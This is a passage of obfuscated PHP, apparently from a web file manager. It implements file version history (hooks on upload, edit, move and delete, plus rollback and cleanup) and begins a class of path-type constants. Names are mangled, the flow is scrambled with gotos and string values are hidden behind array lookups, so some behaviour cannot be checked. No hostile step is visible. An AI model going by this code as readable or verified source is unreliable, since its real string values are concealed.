$F“ùßï‚Ñç[$b‡—Úô–Œ[85]] = Action($b‡—Úô–Œ[1070])->shareItemInfo($F“ùßï‚Ñç[$b‡—Úô–Œ[85]]); } unset($F“ùßï‚Ñç); goto CŞå†½ŒĞœ; CŞå†½ŒĞœ: return $fÁÑ¯ç¹£; goto FÃ¬æ»˜ÌÇ; bÑ—éĞòÂ¸: $b‡—Úô–Œ =& $_SERVER[œº]; $açéó±²Ç = IO::info($this->pathParse[$b‡—Úô–Œ[76]]); if (!$açéó±²Ç) { return array(); } goto EÓ¾ˆ¤¬; FÃ¬æ»˜ÌÇ: } } goto Aµ£êÊ…õ…; a‚î¹ÁÀŒ¸: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto b‹Ÿ¦‹•¥; cİ¢Ø¾Èâ: if ($B©Ÿ …ïˆù[$B½ÚÓ¤ñä[1104]] <= 0) { return; } if (isset($_REQUEST[$B½ÚÓ¤ñä[1105]]) && $_REQUEST[$B½ÚÓ¤ñä[1105]] == $B½ÚÓ¤ñä[87]) { return; } Hook::bind($B½ÚÓ¤ñä[1106], $B½ÚÓ¤ñä[1107]); goto AÖĞØ™õôÖ; b‹Ÿ¦‹•¥: $B½ÚÓ¤ñä =& $_SERVER[œº]; $B©Ÿ …ïˆù = $GLOBALS[$B½ÚÓ¤ñä[6]][$B½ÚÓ¤ñä[88]]; if ($B©Ÿ …ïˆù[$B½ÚÓ¤ñä[1103]] != 1) { return; } goto cİ¢Ø¾Èâ; C¼²õˆ´§Ğ: Hook::bind($B½ÚÓ¤ñä[1114], $B½ÚÓ¤ñä[1115]); Hook::bind($B½ÚÓ¤ñä[1116], $B½ÚÓ¤ñä[1117]); goto Cê‰‡·ï¶ó; AÖĞØ™õôÖ: Hook::bind($B½ÚÓ¤ñä[1108], $B½ÚÓ¤ñä[1109]); Hook::bind($B½ÚÓ¤ñä[1110], $B½ÚÓ¤ñä[1111]); Hook::bind($B½ÚÓ¤ñä[1112], $B½ÚÓ¤ñä[1113]); goto C¼²õˆ´§Ğ; Cê‰‡·ï¶ó: } public static function eventBeforeUpload($d«“§“Ğœè) { if ($d«“§“Ğœè[3] && $d«“§“Ğœè[3] != REPEAT_REPLACE) { return; } $Dˆäº«Á = self::parsePath($d«“§“Ğœè[0]); if (!$Dˆäº«Á) { return; } self::add($Dˆäº«Á); } public static function eventBeforeEdit($E‘Åš± ‘) { $b’½À›‰Õ§ = self::parsePath($E‘Åš± ‘[0]); if (!$b’½À›‰Õ§) { return; } self::add($b’½À›‰Õ§); } public static function eventBeforeCopyFile($CÊ¯¨±ªÉ·, $A¿ë²¥‘ŞÏ, $d‰ÁˆòÛÃŒ, $DÎÀ§®íí, $CÑºö»„«, $C…ß‹²²Ñ¦) { $BŞì…–³ºƒ = $d‰ÁˆòÛÃŒ->getPathOuter($DÎÀ§®íí); $DØ¤ŒìŒ È = self::parsePath($BŞì…–³ºƒ); if (!$DØ¤ŒìŒ È) { return; } self::add($DØ¤ŒìŒ È); } public static function eventBeforeRename($aÉ„ğºòÂŒ) { $eçÕ¨ÛÎÛ„ =& $_SERVER[œº]; $eø¥½œ®à® = self::parsePath($aÉ„ğºòÂŒ[0]); if (!$eø¥½œ®à®) { return; } $fğÎ¥Ï–¡ï = self::checkInHistory($eø¥½œ®à®); if (!$fğÎ¥Ï–¡ï) { return; } if ($fğÎ¥Ï–¡ï[$eçÕ¨ÛÎÛ„[29]] == $eçÕ¨ÛÎÛ„[193]) { $e¨§¤µÈ›‘ = self::listData($eø¥½œ®à®); if ($e¨§¤µÈ›‘ && $e¨§¤µÈ›‘[$eçÕ¨ÛÎÛ„[367]]) { self::moveHistory($eø¥½œ®à®, $aÉ„ğºòÂŒ[1]); } } else { IO::rename($fğÎ¥Ï–¡ï[$eçÕ¨ÛÎÛ„[76]], $aÉ„ğºòÂŒ[1]); } } public static function eventBeforeMove($B¹‡ãáÁ„Å) { goto FğõâŸòç; aõƒŸ„ØÊ®: $C³¹…·®êñ = self::parsePath($B¹‡ãáÁ„Å[1]); if (!$C³¹…·®êñ) { return; } $F„½Ô…×„ = $B¹‡ãáÁ„Å[3]; goto d÷¢§£¹—Ì; FğõâŸòç: $f‘ÀÍõ·–© =& $_SERVER[œº]; $a”ªàëå‘ë = self::parsePath($B¹‡ãáÁ„Å[0]); if (!$a”ªàëå‘ë) { return; } goto aõƒŸ„ØÊ®; d÷¢§£¹—Ì: $D—½µæİë‰ = self::checkInHistory($a”ªàëå‘ë); if (!$D—½µæİë‰) { return; } $e¦ğ­ñ§Ä = self::pathHistory($C³¹…·®êñ); goto D®Ñä ¢Ç; D®Ñä ¢Ç: if ($D—½µæİë‰[$f‘ÀÍõ·–©[29]] == $f‘ÀÍõ·–©[193]) { $AåéØãÄ = self::listData($a”ªàëå‘ë); $cçÁ“ÛÄ±Š = rtrim($C³¹…·®êñ, $f‘ÀÍõ·–©[8]) . $f‘ÀÍõ·–©[8] . ($F„½Ô…×„ ? $F„½Ô…×„ : get_path_this($a”ªàëå‘ë)); $C„Ğ‡ç¸ˆ = self::listData($cçÁ“ÛÄ±Š); if ($AåéØãÄ && $AåéØãÄ[$f‘ÀÍõ·–©[367]] && $C„Ğ‡ç¸ˆ && $C„Ğ‡ç¸ˆ[$f‘ÀÍõ·–©[367]]) { return self::clear($a”ªàëå‘ë); } if ($AåéØãÄ && $AåéØãÄ[$f‘ÀÍõ·–©[367]]) { self::moveHistory($a”ªàëå‘ë, $F„½Ô…×„, $e¦ğ­ñ§Ä); } } else { IO::move($D—½µæİë‰[$f‘ÀÍõ·–©[76]], $e¦ğ­ñ§Ä, !1, $F„½Ô…×„); self::clearEmptyFolder(IO::pathFather($D—½µæİë‰[$f‘ÀÍõ·–©[76]])); } goto D¤ÅíİÕø…; D¤ÅíİÕø…: } public static function eventAfterRemove($F‘Ó•ŒÁ½§, $CèŒ¨ùÂó£) { goto C†¥à¬î–; B™³àÊ¯Š: if ($CŠ¬ÖÌ¬°Î[$F‡ Üç«Û×[29]] == $F‡ Üç«Û×[193]) { $EÌÈ™¦¾©• = self::listData($Fß™†ƒŞÑ«, !1); if ($EÌÈ™¦¾©• && $EÌÈ™¦¾©•[$F‡ Üç«Û×[367]]) { self::clear($Fß™†ƒŞÑ«, !1); } } else { IO::remove($CŠ¬ÖÌ¬°Î[$F‡ Üç«Û×[76]]); self::clearEmptyFolder(IO::pathFather($CŠ¬ÖÌ¬°Î[$F‡ Üç«Û×[76]])); } goto dˆêØˆ‰Ş; C†¥à¬î–: $F‡ Üç«Û× =& $_SERVER[œº]; if (!$CèŒ¨ùÂó£) { return; } $Fß™†ƒŞÑ« = self::parsePath($F‘Ó•ŒÁ½§[0]); goto eÑ¬ñä•çİ; eÑ¬ñä•çİ: if (!$Fß™†ƒŞÑ«) { return; } $CŠ¬ÖÌ¬°Î = self::checkInHistory($Fß™†ƒŞÑ«); if (!$CŠ¬ÖÌ¬°Î) { return; } goto B™³àÊ¯Š; dˆêØˆ‰Ş: } private static function checkInHistory($D’™ò‚ğ±Ê) { $E÷²ë¡¼ê™ = self::pathHistory($D’™ò‚ğ±Ê); if (!IO::exist($E÷²ë¡¼ê™)) { $E÷²ë¡¼ê™ .= $_SERVER[œº][1118]; } return IO::exist($E÷²ë¡¼ê™) ? IO::info($E÷²ë¡¼ê™) : !1; } private static function parsePath($d·ÒÈñˆŠ) { goto BÈàÑ³Šê; Bçó×¦Œ¥: self::log($GLOBALS[$e–°”à¢±ø[1043]] . $e–°”à¢±ø[1123] . $d·ÒÈñˆŠ); return $d·ÒÈñˆŠ; goto CÉÀ¾ñ†ŞŠ; BÈàÑ³Šê: $e–°”à¢±ø =& $_SERVER[œº]; if (!$d·ÒÈñˆŠ) { return !1; } if ($GLOBALS[$e–°”à¢±ø[1119]]) { return; } goto aã³¬§·Ïô; aã³¬§·Ïô: $F½ñó½çº¸ = KodIO::parse($d·ÒÈñˆŠ); $BàÔÁáÏ™ = $F½ñó½çº¸[$e–°”à¢±ø[29]]; $Fó†Ğ¨ğ¶İ = !$BàÔÁáÏ™ || $BàÔÁáÏ™ == KodIO::KOD_IO || $BàÔÁáÏ™ == KodIO::KOD_SHARE_ITEM; goto a£ØÏôã¨; b¸áµ‰Ô ‰: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $e•Úâƒ‰…ç = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $e–°”à¢±ø[1122]); foreach ($e•Úâƒ‰…ç as $cŒ‹ÕÍºù) { if (!$BàÔÁáÏ™ && substr($d·ÒÈñˆŠ, 0, strlen($cŒ‹ÕÍºù)) == $cŒ‹ÕÍºù) { return !1; } } goto Bçó×¦Œ¥; a£ØÏôã¨: if (!$Fó†Ğ¨ğ¶İ || !$F½ñó½çº¸[$e–°”à¢±ø[1120]]) { return !1; } if (substr($d·ÒÈñˆŠ, 0, strlen(DATA_PATH . $e–°”à¢±ø[1121])) == DATA_PATH . $e–°”à¢±ø[1121]) { return !1; } if ($BàÔÁáÏ™ == KodIO::KOD_SHARE_ITEM) { $fºä“ŒáËî = IO::init($d·ÒÈñˆŠ); if ($fºä“ŒáËî->pathParse[$e–°”à¢±ø[1048]]) { return self::parsePath($fºä“ŒáËî->pathParse[$e–°”à¢±ø[1048]]); } return !1; } goto b¸áµ‰Ô ‰; CÉÀ¾ñ†ŞŠ: } private static function pathHistory($dæÃÏ÷ÖÂ) { $C«ëİ½‰¿ =& $_SERVER[œº]; $cè™à¾Õ†» = self::$_historyBase . ltrim(KodIO::clear($dæÃÏ÷ÖÂ), $C«ëİ½‰¿[8]); $cè™à¾Õ†» = str_replace(array($C«ëİ½‰¿[1124]), array($C«ëİ½‰¿[1125]), $cè™à¾Õ†»); return $cè™à¾Õ†»; } public static function log($Cö•¢ÍÃ•×) { } public static function historyCount($Aˆ±Ô£—½µ) { $AæôãÀó¿ê =& $_SERVER[œº]; $a—·¨ãÉ‰ = array(); $cÙ­Ø©ß‡ = array(); foreach ($Aˆ±Ô£—½µ as $A´ïšó‚‡‘) { $Ešáºë•¤Ó = get_path_father($A´ïšó‚‡‘); if (!$cÙ­Ø©ß‡[$Ešáºë•¤Ó]) { $cÙ­Ø©ß‡[$Ešáºë•¤Ó] = array(); } $cÙ­Ø©ß‡[$Ešáºë•¤Ó][] = get_path_this($A´ïšó‚‡‘); } foreach ($cÙ­Ø©ß‡ as $Ešáºë•¤Ó => $b¼ğğÚ§êƒ) { $fÅáó·¢÷‰ = self::parsePath($Ešáºë•¤Ó); if (!$fÅáó·¢÷‰) { continue; } foreach ($b¼ğğÚ§êƒ as $b†Š÷î’Ñ) { $cİ›ìªè­ = self::listData(rtrim($fÅáó·¢÷‰, $AæôãÀó¿ê[8]) . $AæôãÀó¿ê[8] . $b†Š÷î’Ñ, !1); if ($cİ›ìªè­ && $cİ›ìªè­[$AæôãÀó¿ê[367]]) { $a—·¨ãÉ‰[rtrim($Ešáºë•¤Ó, $AæôãÀó¿ê[8]) . $AæôãÀó¿ê[8] . $b†Š÷î’Ñ] = count($cİ›ìªè­[$AæôãÀó¿ê[367]]); } } } return $a—·¨ãÉ‰; } public static function add($F£óÃ¨ì¬) { goto aéñ³È“Œˆ; có³¬’Ö—: $cİØ¼Í…×Í = $Bæ£Ö¶–[$cé¸Æˆ÷®»[367]]; if ($eƒÄ—§Ê‘Î[$cé¸Æˆ÷®»[78]] == 0) { return; } if ($eƒÄ—§Ê‘Î[$cé¸Æˆ÷®»[78]] >= 1024 * 1024 * 500) { return !1; } goto B×¼ëæ; B×¼ëæ: if ($cİØ¼Í…×Í && $cİØ¼Í…×Í[0][$cé¸Æˆ÷®»[171]] == $cÒ¥¾“‹½ˆ) { return !0; } if (array_key_exists($cé¸Æˆ÷®»[196], $eƒÄ—§Ê‘Î) && !$eƒÄ—§Ê‘Î[$cé¸Æˆ÷®»[196]]) { return !1; } $d±‰ù¸ºÀ“ = short_id(time()); goto D²¨Æ´ô¥ê; E÷½»ªòš : if (!$E†å¥«òõª) { self::clearEmptyFolder($Bæ£Ö¶–[$cé¸Æˆ÷®»[1130]]); return !1; } array_unshift($cİØ¼Í…×Í, $Fƒ´ï— ¥©); if (count($cİØ¼Í…×Í) > $Då™ÇÉ›„­) { $eğºöÛÁİÙ = array_slice($cİØ¼Í…×Í, $Då™ÇÉ›„­); foreach ($eğºöÛÁİÙ as $C¨Ğ­½äà) { IO::remove($Bæ£Ö¶–[$cé¸Æˆ÷®»[1130]] . $C¨Ğ­½äà[$cé¸Æˆ÷®»[28]]); } $cİØ¼Í…×Í = array_slice($cİØ¼Í…×Í, 0, $Då™ÇÉ›„­); } goto cÕ¶â­é§ê; cÕ¶â­é§ê: return self::saveData($Bæ£Ö¶–[$cé¸Æˆ÷®»[1131]], $cİØ¼Í…×Í); goto B§½‹î±—º; aéñ³È“Œˆ: $cé¸Æˆ÷®» =& $_SERVER[œº]; $Bæ£Ö¶– = self::listData($F£óÃ¨ì¬); if (!$Bæ£Ö¶–) { return; } goto d²Åè…ÍƒÔ; cõå«¢íƒ: if ($c„ôÆõ”Û <= 0) { return; } $cÒ¥¾“‹½ˆ = IO::hashSimple($F£óÃ¨ì¬); $eƒÄ—§Ê‘Î = IO::info($F£óÃ¨ì¬); goto có³¬’Ö—; D²¨Æ´ô¥ê: $Fƒ´ï— ¥© = array($cé¸Æˆ÷®»[393] => $d±‰ù¸ºÀ“, $cé¸Æˆ÷®»[171] => $cÒ¥¾“‹½ˆ, $cé¸Æˆ÷®»[28] => $eƒÄ—§Ê‘Î[$cé¸Æˆ÷®»[28]] . $cé¸Æˆ÷®»[95] . date($cé¸Æˆ÷®»[1128]) . rand_string(1), $cé¸Æˆ÷®»[78] => $eƒÄ—§Ê‘Î[$cé¸Æˆ÷®»[78]], $cé¸Æˆ÷®»[432] => USER_ID, $cé¸Æˆ÷®»[194] => time(), $cé¸Æˆ÷®»[1129] => $cé¸Æˆ÷®»[33]); IO::mkdir($Bæ£Ö¶–[$cé¸Æˆ÷®»[1130]]); $E†å¥«òõª = IO::copy($F£óÃ¨ì¬, $Bæ£Ö¶–[$cé¸Æˆ÷®»[1130]], !1, $Fƒ´ï— ¥©[$cé¸Æˆ÷®»[28]]); goto E÷½»ªòš ; d²Åè…ÍƒÔ: $c»¦¬ª©ùƒ = Model($cé¸Æˆ÷®»[730])->get($cé¸Æˆ÷®»[1126]); $c„ôÆõ”Û = $GLOBALS[$cé¸Æˆ÷®»[6]][$cé¸Æˆ÷®»[88]][$cé¸Æˆ÷®»[1104]]; $Då™ÇÉ›„­ = $c»¦¬ª©ùƒ == $cé¸Æˆ÷®»[1127] ? 5 : $c„ôÆõ”Û; goto cõå«¢íƒ; B§½‹î±—º: } public static function remove($E©†»½Ş™Ì, $e–ÔøåÃ) { $D¸óÅî•‡± =& $_SERVER[œº]; $E¦¬Ê“°‚ó = self::listData($E©†»½Ş™Ì); $E‰Óä¨´Í = array(); if (!$E¦¬Ê“°‚ó) { return !1; } foreach ($E¦¬Ê“°‚ó[$D¸óÅî•‡±[367]] as $cñòï‰Ó˜) { if ($cñòï‰Ó˜[$D¸óÅî•‡±[393]] == $e–ÔøåÃ) { IO::remove($E¦¬Ê“°‚ó[$D¸óÅî•‡±[1130]] . $cñòï‰Ó˜[$D¸óÅî•‡±[28]]); continue; } $E‰Óä¨´Í[] = $cñòï‰Ó˜; } return self::saveData($E¦¬Ê“°‚ó[$D¸óÅî•‡±[1131]], $E‰Óä¨´Í); } public static function clear($cÆ÷ÙñâÔœ, $bÕ‚ê‡ÀÇ‘ = true) { $B“ÛÇ—¸ßò =& $_SERVER[œº]; $b±ê½È‹¡ = self::listData($cÆ÷ÙñâÔœ, $bÕ‚ê‡ÀÇ‘); if (!$b±ê½È‹¡) { return !1; } foreach ($b±ê½È‹¡[$B“ÛÇ—¸ßò[367]] as $Aë¾øŸíî) { IO::remove($b±ê½È‹¡[$B“ÛÇ—¸ßò[1130]] . $Aë¾øŸíî[$B“ÛÇ—¸ßò[28]]); } return self::saveData($b±ê½È‹¡[$B“ÛÇ—¸ßò[1131]], array()); } public static function moveHistory($CÉ»”¹†Û, $d‚ºä³£ëì = '', $C°ì“Ú¢ó¢ = '') { goto C°£½âğƒ; A„Š´ÆĞï: $E Ê’¹ŠËĞ = $a‘»š½§Î[1118]; $d‚ºä³£ëì = $d‚ºä³£ëì ? $d‚ºä³£ëì : get_path_this($CÉ»”¹†Û); $C°ì“Ú¢ó¢ = $C°ì“Ú¢ó¢ ? $C°ì“Ú¢ó¢ : $fÌ®¢ùˆ [$a‘»š½§Î[1130]]; goto AÚˆî‘øŞ•; C°£½âğƒ: $a‘»š½§Î =& $_SERVER[œº]; $fÌ®¢ùˆ  = self::listData($CÉ»”¹†Û, !1); if (!$fÌ®¢ùˆ  || !$fÌ®¢ùˆ [$a‘»š½§Î[367]]) { return !1; } goto A„Š´ÆĞï; AÚˆî‘øŞ•: $CÔ« •â¹­ = substr(get_path_this($fÌ®¢ùˆ [$a‘»š½§Î[1131]]), 0, -strlen($E Ê’¹ŠËĞ)); foreach ($fÌ®¢ùˆ [$a‘»š½§Î[367]] as $c¿éß‰ëÉ† => $bŞ¦Ê¥Š¨») { $EŒ·¡ÈÉÃÕ = $d‚ºä³£ëì . substr($bŞ¦Ê¥Š¨»[$a‘»š½§Î[28]], strlen($CÔ« •â¹­)); $cõ‚²Šğæ´ = IO::move($fÌ®¢ùˆ [$a‘»š½§Î[1130]] . $bŞ¦Ê¥Š¨»[$a‘»š½§Î[28]], $C°ì“Ú¢ó¢, !1, $EŒ·¡ÈÉÃÕ); if ($cõ‚²Šğæ´) { $fÌ®¢ùˆ [$a‘»š½§Î[367]][$c¿éß‰ëÉ†][$a‘»š½§Î[28]] = $EŒ·¡ÈÉÃÕ; } } $fÌ®¢ùˆ [$a‘»š½§Î[1131]] = IO::move($fÌ®¢ùˆ [$a‘»š½§Î[1131]], $C°ì“Ú¢ó¢, !1, $d‚ºä³£ëì . $E Ê’¹ŠËĞ); goto Eâ¤êÇã¡¾; Eâ¤êÇã¡¾: self::saveData($fÌ®¢ùˆ [$a‘»š½§Î[1131]], $fÌ®¢ùˆ [$a‘»š½§Î[367]]); self::clearEmptyFolder($fÌ®¢ùˆ [$a‘»š½§Î[1130]]); goto Dñ İåÂ¹»; Dñ İåÂ¹»: } public static function rollback($d‡Îôâ—çÄ, $cË•Ù©×ìÆ) { $C©È×®¡ƒ¢ =& $_SERVER[œº]; $bÙ¦©éÈ = self::listData($d‡Îôâ—çÄ); if (!$bÙ¦©éÈ) { return; } $dà±šäÖ¼ë = IO::info($d‡Îôâ—çÄ); foreach ($bÙ¦©éÈ[$C©È×®¡ƒ¢[367]] as $dÆ§ºÉ­¾· => $aƒˆ÷ŞÎ¢) { if ($aƒˆ÷ŞÎ¢[$C©È×®¡ƒ¢[393]] == $cË•Ù©×ìÆ) { self::add($d‡Îôâ—çÄ); $Dìšóğƒ”¬ = $bÙ¦©éÈ[$C©È×®¡ƒ¢[1130]] . $aƒˆ÷ŞÎ¢[$C©È×®¡ƒ¢[28]]; $AÕø¡º¨Âğ = IO::copy($Dìšóğƒ”¬, IO::pathFather($d‡Îôâ—çÄ), REPEAT_REPLACE, $dà±šäÖ¼ë[$C©È×®¡ƒ¢[28]]); if ($AÕø¡º¨Âğ) { self::remove($d‡Îôâ—çÄ, $cË•Ù©×ìÆ); } return $AÕø¡º¨Âğ; } } return !1; } public static function setDetail($AŒæÑˆ¾ÕÆ, $d²Ø–¿‡áÁ, $A½ÙŸçÆçª) { $F‹»ùãÅî =& $_SERVER[œº]; $bğ«ÛŠƒŠÁ = self::listData($AŒæÑˆ¾ÕÆ); if (!$bğ«ÛŠƒŠÁ) { return; } foreach ($bğ«ÛŠƒŠÁ[$F‹»ùãÅî[367]] as $eˆ˜øŞªƒ => $Bğ·¿Ì¢í) { if ($Bğ·¿Ì¢í[$F‹»ùãÅî[393]] == $d²Ø–¿‡áÁ) { $bğ«ÛŠƒŠÁ[$F‹»ùãÅî[367]][$eˆ˜øŞªƒ][$F‹»ùãÅî[1129]] = $A½ÙŸçÆçª; self::saveData($bğ«ÛŠƒŠÁ[$F‹»ùãÅî[1131]], $bğ«ÛŠƒŠÁ[$F‹»ùãÅî[367]]); return !0; } } return !1; } public static function fileInfo($E‰Ñ²ÄŠ‡, $C¬¾ŒÒÒö) { goto fœÌ×ÛÂÅå; fœÌ×ÛÂÅå: $aªòš¢÷¦ =& $_SERVER[œº]; $Fä˜­Ô‡÷ = self::listData($E‰Ñ²ÄŠ‡); if (!$Fä˜­Ô‡÷) { show_json(LNG($aªòš¢÷¦[105]), !1); } goto aŒòÂ±Çº; aŒòÂ±Çº: $bê•Ï¨Ø±à = $aªòš¢÷¦[33]; foreach ($Fä˜­Ô‡÷[$aªòš¢÷¦[367]] as $c™ƒÜñ¬ => $f´óºÔ¾çó) { if ($f´óºÔ¾çó[$aªòš¢÷¦[393]] != $C¬¾ŒÒÒö) { continue; } $bê•Ï¨Ø±à = $Fä˜­Ô‡÷[$aªòš¢÷¦[1130]] . $f´óºÔ¾çó[$aªòš¢÷¦[28]]; break; } if (!$bê•Ï¨Ø±à) { show_json(LNG($aªòš¢÷¦[105]), !1); } goto B‘ÌĞ„§ğÄ; B‘ÌĞ„§ğÄ: return IO::info($bê•Ï¨Ø±à); goto aõà¢£Àƒƒ; aõà¢£Àƒƒ: } public static function fileOut($E»îöˆéîÚ, $A¥³‹†¾äµ, $BõĞ£ˆæò… = false) { $b‡È†¯™ñÏ =& $_SERVER[œº]; $E²½„ŒøË® = self::fileInfo($E»îöˆéîÚ, $A¥³‹†¾äµ); $fÉö¤÷Õ‚¢ =& $GLOBALS[$b‡È†¯™ñÏ[7]]; $BõĞ£ˆæò… = isset($fÉö¤÷Õ‚¢[$b‡È†¯™ñÏ[1094]]) && $fÉö¤÷Õ‚¢[$b‡È†¯™ñÏ[1094]] == 1; if (isset($fÉö¤÷Õ‚¢[$b‡È†¯™ñÏ[29]]) && $fÉö¤÷Õ‚¢[$b‡È†¯™ñÏ[29]] == $b‡È†¯™ñÏ[1132]) { return IO::fileOutImage($E²½„ŒøË®[$b‡È†¯™ñÏ[76]], $fÉö¤÷Õ‚¢[$b‡È†¯™ñÏ[1133]]); } IO::fileOut($E²½„ŒøË®[$b‡È†¯™ñÏ[76]], $BõĞ£ˆæò…, get_path_this($E»îöˆéîÚ)); } public static function listData($Eª‡£Éà¿î, $F»…é™“Ó¹ = true) { goto d¹¹‰ÊŠˆ; A»ÆÂÁèŒ: $aîÒÎÌÃ‹ = IO::getContent($DÃØÍõõ”â[$BòãÔ„¥ùÄ[1131]]); if ($aîÒÎÌÃ‹) { $A› Ï”óÅ = json_decode($aîÒÎÌÃ‹, !0); if (is_array($A› Ï”óÅ)) { $DÃØÍõõ”â[$BòãÔ„¥ùÄ[367]] = $A› Ï”óÅ; } } return $DÃØÍõõ”â; goto e©Áˆ³ÉÉÇ; d¹¹‰ÊŠˆ: $BòãÔ„¥ùÄ =& $_SERVER[œº]; if ($F»…é™“Ó¹ && !IO::exist($Eª‡£Éà¿î)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto a¢ğ†İ×Ïô; a¢ğ†İ×Ïô: if (substr($Eª‡£Éà¿î, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $D©»ŸÍñéÀ = self::pathHistory($Eª‡£Éà¿î); $DÃØÍõõ”â = array($BòãÔ„¥ùÄ[1131] => $D©»ŸÍñéÀ . $BòãÔ„¥ùÄ[1118], $BòãÔ„¥ùÄ[1130] => rtrim(get_path_father($D©»ŸÍñéÀ), $BòãÔ„¥ùÄ[8]) . $BòãÔ„¥ùÄ[8], $BòãÔ„¥ùÄ[367] => array()); goto A»ÆÂÁèŒ; e©Áˆ³ÉÉÇ: } private static function saveData($bÎ‚–³´¶, $cŸ†õ¨È½î) { goto FÙ˜Ÿ¶ãµ; b ˆÄï‘è: return !0; goto b¸„õ„¢©š; F£²æ±×·±: $A˜èøáÃÒ™ = IO::pathFather($bÎ‚–³´¶); IO::remove($bÎ‚–³´¶); self::clearEmptyFolder($A˜èøáÃÒ™); goto b ˆÄï‘è; FÙ˜Ÿ¶ãµ: $Eé×õÕ½Ü© =& $_SERVER[œº]; self::log($Eé×õÕ½Ü©[1134] . $bÎ‚–³´¶ . $Eé×õÕ½Ü©[68] . count($cŸ†õ¨È½î), $Eé×õÕ½Ü©[712]); if ($cŸ†õ¨È½î) { return IO::setContent($bÎ‚–³´¶, json_encode($cŸ†õ¨È½î)); } goto F£²æ±×·±; b¸„õ„¢©š: } public static function clearEmptyFolder($Bö‚®Ç°Š¬) { goto eƒ¢«Øçš; cÈêÅà«¸à: $eÚ‡¤İš¡è = IO::has($Bö‚®Ç°Š¬, !0); if ($eÚ‡¤İš¡è[$céÂÍ‚×·[203]] > 0 || $eÚ‡¤İš¡è[$céÂÍ‚×·[204]] > 0) { return; } IO::remove($Bö‚®Ç°Š¬); goto B±¨ŒÏÙã; B±¨ŒÏÙã: self::clearEmptyFolder($c«ƒÎ•êù‡); goto b™­«¼ÊÈ†; eƒ¢«Øçš: $céÂÍ‚×· =& $_SERVER[œº]; if (trim($Bö‚®Ç°Š¬, $céÂÍ‚×·[8]) == trim(self::$_historyBase, $céÂÍ‚×·[8])) { return; } $c«ƒÎ•êù‡ = IO::pathFather($Bö‚®Ç°Š¬); goto cÈêÅà«¸à; b™­«¼ÊÈ†: } private static function getBasePath() { goto f¸¢‘²¿¬Ã; AÖèïÎçĞ: $EÉ®Ÿ§£íÑ = DATA_PATH . $AßÚ«†«±×[1137] . rand_string(8) . $AßÚ«†«±×[8]; $EÉ®Ÿ§£íÑ = IO::mkdir($EÉ®Ÿ§£íÑ); $EÉ®Ÿ§£íÑ = rtrim($EÉ®Ÿ§£íÑ, $AßÚ«†«±×[8]) . $AßÚ«†«±×[8]; goto B¥Íº®±Í÷; e¸…ª÷½–´: return $EÉ®Ÿ§£íÑ; goto BÎÊÏë¬½¦; B¥Íº®±Í÷: file_put_contents($EÉ®Ÿ§£íÑ . $AßÚ«†«±×[1138], $AßÚ«†«±×[33]); file_put_contents(DATA_PATH . $AßÚ«†«±×[1138], $AßÚ«†«±×[33]); Model($AßÚ«†«±×[1135])->set($AßÚ«†«±×[1136], $EÉ®Ÿ§£íÑ); goto e¸…ª÷½–´; f¸¢‘²¿¬Ã: $AßÚ«†«±× =& $_SERVER[œº]; $EÉ®Ÿ§£íÑ = Model($AßÚ«†«±×[1135])->get($AßÚ«†«±×[1136]); if ($EÉ®Ÿ§£íÑ) { if (!IO::exist($EÉ®Ÿ§£íÑ)) { IO::mkdir($EÉ®Ÿ§£íÑ); } if (get_path_this($EÉ®Ÿ§£íÑ) == $AßÚ«†«±×[1121]) { $Eñå‡â¦†Ş = $AßÚ«†«±×[1137] . rand_string(8); @rename($EÉ®Ÿ§£íÑ, get_path_father($EÉ®Ÿ§£íÑ) . $AßÚ«†«±×[8] . $Eñå‡â¦†Ş); $EÉ®Ÿ§£íÑ = DATA_PATH . $Eñå‡â¦†Ş . $AßÚ«†«±×[8]; file_put_contents(DATA_PATH . $AßÚ«†«±×[1138], $AßÚ«†«±×[33]); Model($AßÚ«†«±×[1135])->set($AßÚ«†«±×[1136], $EÉ®Ÿ§£íÑ); } return $EÉ®Ÿ§£íÑ; } goto AÖèïÎçĞ; BÎÊÏë¬½¦: } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\x75\x72\x63\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\162\x52\x65\143\x79\x63\x6c\145\x7d"; const KOD_USER_FAV = "\173\165\x73\x65\x72\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\162\106\x69\x6c\145\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\106\151\154\145\x54\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\x75\x70\x52\x6f\x6f\x74\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\173\x75\x73\x65\x72\x53\150\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\162\x53\150\x61\x72\x65\114\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\162\x65\124\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\173\x73\150\x61\162\145\x49\164\145\x6d\175"; const KOD_SHARE_LINK = "\173\163\x68\141\162\x65\x49\164\145\155\114\151\x6e\153\175"; const KOD_SEARCH = "\173\163\x65\141\162\x63\x68\175"; const KOD_BLOCK = "\173\x62\154\x6f\143\x6b\x7d"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\145\x72\x52\x65\156\x63\145\x6e\164\175"; const KOD_USER_DRIVER = "\173\144\x72\x69\x76\145\162\175"; public static function typeList() { $fåËİË‡‘Ë =& $_SERVER[œº]; return array($fåËİË‡‘Ë[1139] => self::KOD_SOURCE, $fåËİË‡‘Ë[1140] => self::KOD_USER_RECYCLE, $fåËİË‡‘Ë[1141] => self::KOD_USER_FAV, $fåËİË‡‘Ë[1142] => self::KOD_USER_FILE_TAG, $fåËİË‡‘Ë[1143] => self::KOD_USER_FILE_TYPE, $fåËİË‡‘Ë[1144] => self::KOD_GROUP_ROOT_SELF, $fåËİË‡‘Ë[1145] => self::KOD_USER_SHARE, $fåËİË‡‘Ë[1146] => self::KOD_USER_SHARE_LINK, $fåËİË‡‘Ë[1147] => self::KOD_USER_SHARE_TO_ME, $fåËİË‡‘Ë[1148] => self::KOD_SHARE_ITEM, $fåËİË‡‘Ë[1149] => 